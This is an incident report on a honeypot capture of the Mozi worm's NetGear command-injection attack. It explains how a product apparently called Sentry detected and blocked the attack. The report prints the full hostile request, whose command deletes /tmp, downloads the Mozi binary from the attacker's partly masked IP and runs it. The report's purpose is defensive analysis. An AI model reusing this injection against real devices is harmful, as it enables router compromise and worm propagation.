# Incident Report — Mozi Worm Self-Propagation (Honeypot Capture)

Companion to `incident-report-mozi-rce.md`. Second and third sightings of
the same worm payload against a production Sentry honeypot deployment;
attacker IPs are partially masked.

## TL;DR

Three days after the first Mozi capture, the same NetGear command-injection
worm hit the honeypot again from a different infected host — this time with
the payload's download URL pointing at the **attacker's own IP address**,
the fingerprint of an actively self-propagating worm. Same result as before:
**88/100 critical, blocked at the edge with 403**, IP banned for 24h. Two
independent infections, identical detection chain, zero executions.

## Event summary

| Field | Value |
| --- | --- |
| Timestamp | 2026-10-08 07:52:33 UTC |
| Source | `http_proxy` (inline edge, port 80) |
| Attacker | `153.117.66.xxx` (masked, APNIC range) |
| Method / Path | `GET /setup.cgi` |
| Risk score | 88 — **critical** |
| Verdict | **block** (HTTP 403) |
| Aftermath | IP banned 24h (`ip_state`, reason `rce`) |

Notably, 0.7s before the HTTP request, the edge's TCP listener had already
logged a bare connection event from the same IP — the worm connects first,
speaks HTTP second, and both layers of telemetry captured it.

## The payload

```
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd
    &cmd=rm -rf /tmp/*;wget http://153.117.66.xxx:33581/Mozi.m -O /tmp/netgear;sh netgear
    &curpath=/&currentsetting.htm=1
```

Compare with the first capture (`incident-report-mozi-rce.md`), where the
download URL pointed at `192.168.1.1:8088` — the infected router's own
gateway. Here the URL embeds the attacker's **public IP on a high port**
(`:33581`), meaning this node runs its own Mozi distribution server and the
worm is propagating host-to-host across the internet. Each infected device
re-sprays the same injection against every HTTP endpoint it scans.

## How Sentry caught it

Identical chain to the first capture — the detection is generic, not a
Mozi signature:

1. `CmdInjection` heuristic on the URL-decoded query → signal `rce`, weight 70
2. Missing User-Agent → signal `suspicious_u_a`, weight 10
3. `/setup.cgi` not a known route → signal `unknown_route`, weight 8

Total **88/100 → critical → verdict `block`** → 403 served by the edge,
request never proxied, 24h IP ban recorded before the next packet could
arrive.

## Why this demonstrates effectiveness

- **Consistency across infections.** Two unrelated compromised hosts, one
  behavioral signature, the same automatic outcome — no tuning happened
  between the captures.
- **Worm propagation is self-identifying.** Payloads that embed their own
  C2 address are trivial for a generic command-injection heuristic; there
  is no need to track the botnet's infrastructure.
- **Layered telemetry.** The TCP-level connection event and the HTTP
  request are both persisted, so the incident timeline starts 0.7s before
  the attack itself.
